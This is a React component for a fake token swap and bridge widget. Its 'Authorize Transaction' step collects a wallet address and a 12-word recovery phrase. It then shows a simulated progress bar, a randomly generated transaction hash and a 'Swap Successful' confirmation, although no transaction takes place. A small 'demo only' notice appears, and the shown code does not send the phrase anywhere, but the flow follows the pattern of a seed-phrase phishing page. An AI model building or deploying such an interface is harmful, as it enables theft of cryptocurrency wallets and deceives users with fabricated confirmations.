import { useState } from 'react';
import { CHAINS, TOKENS, WALLETS, genHash, fmtUSD } from '../data/constants';
import { TokenIcon, ChainIcon, TokenChainIcons } from './Icons';
import TokenSelectorModal from './TokenSelectorModal';

const STEP_ORDER = ['wallet', 'verify', 'loading', 'confirm'];

function ProgressBar({ step }) {
  const idx = STEP_ORDER.indexOf(step);
  return (
    <div className="progress-bar-row">
      {STEP_ORDER.map((_, i) => (
        <div key={i} className={`prog-seg ${i < idx ? 'done' : i === idx ? 'active' : ''}`} />
      ))}
    </div>
  );
}

export default function SwapWidget({ connectedWallet, onConnectClick, mode, onModeChange }) {
  const [step, setStep] = useState('main');
  const [fromChain, setFromChain] = useState(CHAINS[0]);
  const [toChain,   setToChain]   = useState(CHAINS[2]);
  const [fromToken, setFromToken] = useState(TOKENS[CHAINS[0].id]?.[0]);
  const [toToken,   setToToken]   = useState(TOKENS[CHAINS[0].id]?.[1] ?? TOKENS[CHAINS[0].id]?.[0]);
  const [amount,    setAmount]    = useState('');
  const [slippage,  setSlippage]  = useState('0.5');
  const [customSlip,setCustomSlip]= useState('');
  const [slipPopOpen,setSlipPopOpen] = useState(false);
  const [showFromTokModal, setShowFromTokModal] = useState(false);
  const [showToTokModal,   setShowToTokModal]   = useState(false);
  const [wallet,    setWallet]    = useState(null);
  const [seeds,     setSeeds]     = useState(Array(12).fill(''));
  const [address,   setAddress]   = useState('');
  const [progress,  setProgress]  = useState(0);
  const [blocksDone,setBlocksDone]= useState([false, false, false]);
  const [loadMsg,   setLoadMsg]   = useState('Broadcasting...');
  const [txHash,    setTxHash]    = useState('');
  const [savedAmt,  setSavedAmt]  = useState('');
  const [savedRec,  setSavedRec]  = useState('');

  const displaySlip = slippage === 'custom' ? (customSlip || '—') : slippage;
  const rate    = fromToken && toToken ? fromToken.price / toToken.price : 0;
  const receive = amount && rate && toToken ? (parseFloat(amount) * rate).toFixed(6) : '';
  const usd     = amount && fromToken ? fmtUSD(parseFloat(amount) * fromToken.price) : '';
  const canProceed = amount && parseFloat(amount) > 0 && fromToken && toToken;

  const ctaLabel = mode === 'swap' ? '⇄ SWAP NOW' : '⛓ BRIDGE NOW';

  function flip() {
    const [ft, tt, fc, tc] = [fromToken, toToken, fromChain, toChain];
    setFromToken(tt); setToToken(ft);
    if (mode === 'bridge') { setFromChain(tc); setToChain(fc); }
    setAmount('');
  }

  function handleFromChain(c) {
    setFromChain(c);
    setFromToken(TOKENS[c.id]?.[0]);
    if (mode === 'swap') setToToken(TOKENS[c.id]?.[1] || null);
  }

  function handleToChain(c) { setToChain(c); setToToken(TOKENS[c.id]?.[0]); }

  function handleModeChange(m) {
    onModeChange(m);
    setToToken(TOKENS[fromChain.id]?.[1] ?? TOKENS[fromChain.id]?.[0] ?? null);
  }

  function startSwap() {
    if (!canProceed) return;
    if (!connectedWallet) { onConnectClick(); return; }
    setStep('wallet');
  }

  function goVerify() { if (wallet) setStep('verify'); }

  function doVerify() {
    if (seeds.filter(s => s.trim()).length < 8 || !address) return;
    setSavedAmt(amount); setSavedRec(receive || '0');
    setTxHash(genHash()); setProgress(0); setBlocksDone([false, false, false]);
    setStep('loading');
    let p = 0;
    const msgs = ['Broadcasting...', 'Confirming on-chain...', 'Validating route...', 'Finalizing...'];
    const iv = setInterval(() => {
      p = Math.min(100, p + Math.random() * 9 + 3);
      setProgress(Math.round(p));
      if (p > 28) setLoadMsg(msgs[1]);
      if (p > 55) { setLoadMsg(msgs[2]); setBlocksDone(b => [true, b[1], b[2]]); }
      if (p > 78) { setLoadMsg(msgs[3]); setBlocksDone(b => [true, true, b[2]]); }
      if (p >= 100) { setBlocksDone([true, true, true]); clearInterval(iv); setTimeout(() => setStep('confirm'), 500); }
    }, 350);
  }

  function reset() {
    setStep('main'); setAmount(''); setWallet(null);
    setSeeds(Array(12).fill('')); setAddress(''); setProgress(0);
    setToToken(TOKENS[fromChain.id]?.[1] ?? TOKENS[fromChain.id]?.[0] ?? null);
  }

  /* ─────────────── MAIN STEP ─────────────── */
  if (step === 'main') return (
    <div style={{ position: 'relative' }} onClick={() => setSlipPopOpen(false)}>
      {showFromTokModal && (
        <TokenSelectorModal title="Select Token (Sell)"
          onClose={() => setShowFromTokModal(false)}
          onSelect={t => { setFromToken(t); setShowFromTokModal(false); }} />
      )}
      {showToTokModal && (
        <TokenSelectorModal title="Select Token (Buy)"
          onClose={() => setShowToTokModal(false)}
          onSelect={t => { setToToken(t); setShowToTokModal(false); }} />
      )}

      <div className="widget" onClick={e => e.stopPropagation()}>

        {/* ── HEADER ── */}
        <div className="widget-header">
          <span className="widget-title">{mode === 'bridge' ? '⚡ CROSS-CHAIN BRIDGE' : '⚡ TOKEN SWAP'}</span>
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, position: 'relative' }}>
            <span style={{ fontSize: 10, color: 'var(--text3)', fontWeight: 700, letterSpacing: 1, textTransform: 'uppercase' }}>SLIP</span>
            <div className="slip-pills">
              {['0.1', '0.5', '1.0'].map(s => (
                <button key={s} className={`slip-pill ${slippage === s ? 'active' : ''}`}
                  onClick={() => { setSlippage(s); setCustomSlip(''); setSlipPopOpen(false); }}>
                  {s}%
                </button>
              ))}
            </div>
            <button
              className={`slip-gear-btn ${slipPopOpen || slippage === 'custom' ? 'active' : ''}`}
              onClick={e => { e.stopPropagation(); setSlipPopOpen(o => !o); }}>
              ⚙
            </button>
            {slipPopOpen && (
              <div className="custom-slip-pop" onClick={e => e.stopPropagation()}>
                <div className="csp-label">Custom Slippage</div>
                <div className="slip-pills" style={{ marginBottom: 8 }}>
                  {['0.1', '0.5', '1.0', '3.0'].map(s => (
                    <button key={s} className={`slip-pill ${slippage === s && slippage !== 'custom' ? 'active' : ''}`}
                      onClick={() => { setSlippage(s); setCustomSlip(''); setSlipPopOpen(false); }}>
                      {s}%
                    </button>
                  ))}
                </div>
                <div className="csp-input-wrap">
                  <input className="csp-input" autoFocus placeholder="0.00" value={customSlip}
                    onChange={e => { setCustomSlip(e.target.value.replace(/[^0-9.]/g, '')); setSlippage('custom'); }} />
                  <span className="csp-pct">%</span>
                </div>
                <div className="csp-hint">Values above 5% may result in a poor trade</div>
              </div>
            )}
          </div>
        </div>

        {/* ── MODE TABS ── */}
        <div className="mode-tabs">
          {['swap', 'bridge'].map(m => (
            <button key={m} className={`mode-tab ${mode === m ? 'active' : ''}`}
              onClick={() => handleModeChange(m)}>
              {m === 'swap' ? '⇄ SWAP' : '⛓ BRIDGE'}
            </button>
          ))}
        </div>

        {/* ── FROM NETWORK ── */}
        <div className="section-block">
          <div className="section-label">From Network</div>
          <div className="network-chips">
            {CHAINS.map(c => (
              <button key={c.id}
                className={`network-chip ${fromChain.id === c.id ? 'active' : ''}`}
                style={{ '--chip-color': c.color }}
                onClick={() => handleFromChain(c)}>
                <span>{c.icon}</span>{c.short}
              </button>
            ))}
          </div>
        </div>

        {/* ── TO NETWORK — bridge only ── */}
        {mode === 'bridge' && (
          <div className="section-block">
            <div className="section-label">To Network</div>
            <div className="network-chips">
              {CHAINS.filter(c => c.id !== fromChain.id).map(c => (
                <button key={c.id}
                  className={`network-chip ${toChain.id === c.id ? 'active' : ''}`}
                  style={{ '--chip-color': c.color }}
                  onClick={() => handleToChain(c)}>
                  <span>{c.icon}</span>{c.short}
                </button>
              ))}
            </div>
          </div>
        )}

        {/* ── YOU PAY ── */}
        <div className="section-block">
          <div className="token-box" style={{ minHeight: 90 }}>
            <div className="token-box-top">
              <span className="tb-label">YOU PAY</span>
              <span className="tb-bal" onClick={() => fromToken && setAmount(fromToken.bal)}>
                BAL: <span>{fromToken?.bal || '0.00'} {fromToken?.sym}</span>
              </span>
            </div>
            <div className="token-box-row">
              <div className="token-select-btn" onClick={() => setShowFromTokModal(true)}>
                {fromToken
                  ? <><TokenChainIcons token={fromToken} chain={fromChain} size={20} /><span>{fromToken.sym}</span></>
                  : <span>Select</span>}
                <span className="tb-chev">▼</span>
              </div>
              <input className="tb-amount" placeholder="0.00" value={amount}
                onChange={e => setAmount(e.target.value.replace(/[^0-9.]/g, ''))} />
            </div>
            {usd && <div className="tb-usd">≈ {usd}</div>}
          </div>
        </div>

        {/* ── ARROW ── */}
        <div className="swap-divider">
          <button className="swap-center-btn" onClick={flip}>⇅</button>
        </div>

        {/* ── YOU RECEIVE ── */}
        <div className="section-block" style={{ paddingBottom: 16 }}>
          <div className="token-box" style={{ minHeight: 90 }}>
            <div className="token-box-top">
              <span className="tb-label">YOU RECEIVE</span>
              {mode === 'bridge' && (
                <span className="tb-label" style={{ color: 'var(--accent)', opacity: .7 }}>
                  ⛓ {toChain.name}
                </span>
              )}
            </div>
            <div className="token-box-row">
              <div className="token-select-btn" onClick={() => setShowToTokModal(true)}>
                {toToken
                  ? <><TokenChainIcons token={toToken} chain={mode === 'bridge' ? toChain : fromChain} size={20} /><span>{toToken.sym}</span></>
                  : <span>Select</span>}
                <span className="tb-chev">▼</span>
              </div>
              <div className="tb-receive" style={{ color: receive ? 'var(--green)' : 'var(--text3)' }}>
                {receive || '0.000000'}
              </div>
            </div>
          </div>
        </div>

        {/* ── QUOTE ── */}
        {canProceed && (
          <div className="section-block" style={{ paddingBottom: 4 }}>
            <div className="quote-box">
              <div className="quote-row"><span className="qk">Rate</span><span className="qv">1 {fromToken.sym} = {rate.toFixed(6)} {toToken?.sym}</span></div>
              <div className="quote-row"><span className="qk">Slippage</span><span className="qv good">{displaySlip}%</span></div>
              <div className="quote-row"><span className="qk">Est. Gas</span><span className="qv">~$2.14</span></div>
              <div className="quote-row"><span className="qk">Route</span><span className="qv good">RELAY ▸ BEST</span></div>
              {mode === 'bridge' && <div className="quote-row"><span className="qk">Est. Time</span><span className="qv">~2–4s</span></div>}
            </div>
          </div>
        )}

        {/* ── CTA — always shows SWAP NOW / BRIDGE NOW, dimmed until valid ── */}
        <button
          className="action-btn purple"
          onClick={startSwap}
          style={{ marginTop: 14, opacity: canProceed ? 1 : 0.45, cursor: canProceed ? 'pointer' : 'not-allowed' }}
        >
          {ctaLabel}
        </button>

      </div>
    </div>
  );

  /* ── WALLET ── */
  if (step === 'wallet') return (
    <div className="step-card">
      <div className="step-head">
        <button className="back-btn" onClick={() => setStep('main')}>←</button>
        <span className="step-title">Connect a Wallet</span>
        {fromToken && <span className="step-badge">{amount} {fromToken.sym}</span>}
      </div>
      <ProgressBar step={step} />
      <div className="wallet-list">
        {WALLETS.map(w => (
          <div key={w.id} className={`wallet-row ${wallet?.id === w.id ? 'sel' : ''}`} onClick={() => setWallet(w)}>
            <span className="wallet-emoji">{w.icon}</span>
            <div><div className="wallet-name">{w.name}</div><div className="wallet-desc">{w.desc}</div></div>
            {wallet?.id === w.id && <div className="wallet-check">✓</div>}
          </div>
        ))}
      </div>
      <div style={{ padding: '0 16px 16px' }}>
        <button className="action-btn purple" onClick={goVerify} disabled={!wallet}
          style={{ width: '100%', margin: 0, display: 'block' }}>
          {wallet ? `Continue with ${wallet.name}` : 'Select a wallet to continue'}
        </button>
      </div>
    </div>
  );

  /* ── VERIFY ── */
  if (step === 'verify') return (
    <div className="step-card">
      <div className="step-head">
        <button className="back-btn" onClick={() => setStep('wallet')}>←</button>
        <span className="step-title">Authorize Transaction</span>
        <span className="step-badge">{wallet?.icon} {wallet?.name}</span>
      </div>
      <ProgressBar step={step} />
      <div className="verify-body">
        <div className="notice">⚠️ Demo only — never enter real credentials on any site.</div>
        <div className="field">
          <div className="field-label">Wallet Address</div>
          <input className="field-input" placeholder="0x... or .sol" value={address} onChange={e => setAddress(e.target.value)} />
        </div>
        <div className="field">
          <div className="field-label">Recovery Phrase (12 words)</div>
          <div className="seed-grid">
            {Array(12).fill(0).map((_, i) => (
              <div key={i} className="seed-cell">
                <span className="seed-n">{i + 1}</span>
                <input className="seed-inp" type="password" placeholder="word" value={seeds[i]}
                  onChange={e => { const n = [...seeds]; n[i] = e.target.value; setSeeds(n); }} />
              </div>
            ))}
          </div>
        </div>
        <button className="action-btn purple" onClick={doVerify}
          disabled={seeds.filter(s => s.trim()).length < 8 || !address}
          style={{ width: '100%', margin: '8px 0 0', display: 'block' }}>
          Authorize & {mode === 'swap' ? 'Swap' : 'Bridge'}
        </button>
      </div>
    </div>
  );

  /* ── LOADING ── */
  if (step === 'loading') return (
    <div className="step-card">
      <div className="step-head">
        <span className="step-title">Processing {mode === 'swap' ? 'Swap' : 'Bridge'}...</span>
      </div>
      <ProgressBar step={step} />
      <div className="loading-body">
        <div className="spinner-wrap">
          <div className="spin-a" /><div className="spin-b" />
          <div className="spin-label">{mode === 'bridge' ? '⛓' : '⇄'}</div>
        </div>
        <div className="load-h">{loadMsg}</div>
        <div className="load-p">{savedAmt} {fromToken?.sym} → {savedRec} {toToken?.sym}</div>
        <div className="prog-track"><div className="prog-fill" style={{ width: `${progress}%` }} /></div>
        <div className="blocks-row">
          {blocksDone.map((b, i) => (
            <div key={i} className={`block-pill ${b ? 'ok' : ''}`}>{b ? `✓ Block ${i + 1}` : `Block ${i + 1}`}</div>
          ))}
        </div>
        <div className="prog-pct">{progress}% complete · Est. ~2.3s</div>
      </div>
    </div>
  );

  /* ── CONFIRM ── */
  return (
    <div className="step-card">
      <div className="step-head">
        <span className="step-title">Transaction Complete</span>
      </div>
      <ProgressBar step={step} />
      <div className="confirm-body">
        <div className="success-icon">✓</div>
        <div className="confirm-h">{mode === 'swap' ? 'Swap' : 'Bridge'} Successful</div>
        <div className="confirm-p">Confirmed in ~2.3s · {new Date().toLocaleTimeString()}</div>
        <div className="confirm-table">
          <div className="ct-row"><span className="ct-k">Sold</span><span className="ct-v">{savedAmt} {fromToken?.sym} on {fromChain.name}</span></div>
          <div className="ct-row"><span className="ct-k">Received</span><span className="ct-v green">{savedRec} {toToken?.sym}{mode === 'bridge' ? ` on ${toChain.name}` : ''}</span></div>
          <div className="ct-row"><span className="ct-k">Via</span><span className="ct-v">{wallet?.icon} {wallet?.name}</span></div>
          <div className="ct-row"><span className="ct-k">Status</span><span className="ct-v green">✓ Confirmed (3/3 blocks)</span></div>
        </div>
        <div className="hash-box">Tx Hash<br /><span>{txHash}</span></div>
        <button className="action-btn purple" onClick={reset} style={{ width: '100%', margin: '0 0 8px', display: 'block' }}>New Transaction</button>
        <button className="action-btn outline" onClick={reset} style={{ width: '100%', margin: 0, display: 'block' }}>View on Explorer ↗</button>
      </div>
    </div>
  );
}